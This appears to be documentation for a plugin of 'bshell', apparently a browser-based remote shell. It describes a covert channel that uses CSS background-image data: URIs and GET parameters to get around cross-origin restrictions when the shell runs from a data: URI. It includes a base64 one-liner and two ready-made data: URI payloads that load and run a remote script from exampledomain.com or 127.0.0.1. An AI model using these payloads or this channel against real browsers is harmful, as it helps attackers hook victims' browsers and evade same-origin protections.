# Running bshell from a data: URI


#### Primary Mission
Make bshell run from a data: URI

#### Secondary Mission:
Eliminate cross-domain restrictions for communicating with the server

## HowItGotToBe

The first attempt at making this work started in the browser console after entering an initial data:text/html;base64, uri:
`LOG: starting BsHell bshell.js:297

LOG: detected myself at http://exampledomain.com/bshell.js bshell.js:297

Uncaught Error: SECURITY_ERR: DOM Exception 18 `

This was because access the document.cookie property is restricted. try/catch and then further messages in the console:
`XMLHttpRequest cannot load http://exampledomain.com/bshell.php. Cannot make any requests from null.`

From null? That's because `document.location.origin` is null, understandably, since running from a data: uri, what would origin be?

So, XHR is out of the way then. How else can we get to the server then? 

Method of choice here was CSS-styling, exploiting the fact that you can pass rather big fragments of data in a image-uri, aswell as in a normal HTTP GET request parameter.


## Methodology

The method involves attaching an element with a unique id to the document, and then attaching a new &lt;link href=&gt; pointing to a customized server-script. This server script responds with a css declaration that attaches a background image to the (previously created) element. 

Once the browser loads the stylesheet, our element will be styled with the background image and we can read the elements style using
getComputedStyle (or currentStyle in IE). The image is a data: encoded uri, that we can easily decode and treat as a JSON packet.

Sending data to the server is done using a normal GET query parameter.


## Limitations

- There has been no problems observed with way over 100kb sent to any browser.

- Request-URI lengths are limited in most browsers and servers, so passing large packets of data back to the server _could_ be a problem.


## Examples

### data: URI
Creating the data: URI is simple:
`]$ echo "<html><head><script type='text/javascript' src='http://exampledomain.com/plugins/css_channel/css_channel.php/bshell.js'> </script></head></html>" | base64 -w0 |awk '{print "data:text/html;base64,"$0}'`

Here it is for you if your setup is with exampledomain.com:
`data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovL2V4YW1wbGVkb21haW4uY29tL3BsdWdpbnMvY3NzX2NoYW5uZWwvY3NzX2NoYW5uZWwucGhwL2JzaGVsbC5qcyc+IDwvc2NyaXB0PjwvaGVhZD48L2h0bWw+Cg==`

Or if you use 127.0.0.1:
`data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovLzEyNy4wLjAuMS9wbHVnaW5zL2Nzc19jaGFubmVsL2Nzc19jaGFubmVsLnBocC9ic2hlbGwuanMnPiA8L3NjcmlwdD48L2hlYWQ+PC9odG1sPgo=`
